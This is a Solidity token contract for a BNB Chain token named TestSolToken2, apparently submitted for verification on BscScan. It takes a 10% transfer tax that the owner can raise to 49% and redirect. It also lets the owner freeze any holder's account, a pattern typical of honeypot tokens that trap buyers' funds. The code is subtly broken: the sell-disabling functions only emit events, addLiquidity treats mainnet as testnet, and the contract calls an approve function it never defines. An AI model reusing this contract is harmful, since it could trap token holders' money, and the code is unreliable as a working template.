/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MyToken is Ownable {
    using SafeMath for uint256;

    string public name = "TestSolToken2";
    string public symbol = "TST2";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10**18; // 1 million tokens with 18 decimal places

    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public locked;

    address public taxAddress = 0xA9A468d182A83c25D545827821D848E2FCeF2AA1; // Address to receive 10% tax

    uint256 public taxPercent = 10; // 10% tax on every buy and sell

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Locked(address indexed account, bool locked);
    event DisableSell(bool isDisabled);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        require(!locked[msg.sender], "Account is locked");

        uint256 tax = value.mul(taxPercent).div(100);
        uint256 amount = value.sub(tax);

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(value);
        balanceOf[to] = balanceOf[to].add(amount);
        balanceOf[taxAddress] = balanceOf[taxAddress].add(tax);

        emit Transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, taxAddress, tax);

        return true;
    }

    function setTaxAddress(address newTaxAddress) public onlyOwner {
    taxAddress = newTaxAddress;
}

function setTaxPercent(uint256 newTaxPercent) public onlyOwner {
    require(newTaxPercent < 50, "Tax percent must be less than 50 becase max slipage on pancake is 50 and it will be unsellable/buyable");
    taxPercent = newTaxPercent;
}


    function lockAccount(address account) public onlyOwner {
        locked[account] = true;
        emit Locked(account, true);
    }

function unlockAccount(address account) public onlyOwner {
    locked[account] = false;
    emit Locked(account, false);
}

function isLockedAccount(address account) public onlyOwner view returns (bool) {
    return locked[account];
}

    function disableSell(bool isDisabled) public onlyOwner {
    emit DisableSell(isDisabled);
}

function enableSell() public onlyOwner {
    emit DisableSell(false);
}

function addLiquidity(uint256 tokenAmount, uint256 bnbAmount, uint256 minTokenAmount, uint256 minBNBAmount) public onlyOwner {
    // Check if the contract is on the Binance Smart Chain testnet (BEP-20)
    bool isTestnet = false;
    if (block.chainid == 97 || block.chainid == 56) {
        isTestnet = true;
    }

    // Set the router and factory addresses based on whether the contract is on the testnet
    address pancakeRouter;
    address pancakeFactory;
    if (isTestnet) {
        pancakeRouter = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // Testnet Router address
        pancakeFactory = 0x6725F303b657a9451d8BA641348b6761A6CC7a17; // Testnet Factory address
    } else {
        pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Mainnet Router address
        pancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73; // Mainnet Factory address
    }

    // Get the address of the PancakeSwap pair for the token and BNB
    address pancakePair = IPancakeFactory(pancakeFactory).getPair(address(this), IPancakeRouter02(pancakeRouter).WETH());

    // If the pair doesn't exist, create it first
    if (pancakePair == address(0)) {
        pancakePair = IPancakeFactory(pancakeFactory).createPair(address(this), IPancakeRouter02(pancakeRouter).WETH());
    }

    // Approve the PancakeSwap Router to spend the tokenAmount
    IERC20(address(this)).approve(pancakeRouter, tokenAmount);

    // Add liquidity to the PancakeSwap pair using the tokenAmount and bnbAmount
    IPancakeRouter02(pancakeRouter).addLiquidityETH{value: bnbAmount}(
        address(this),
        tokenAmount,
        minTokenAmount,
        minBNBAmount,
        address(this),
        block.timestamp + 360
    );
}


}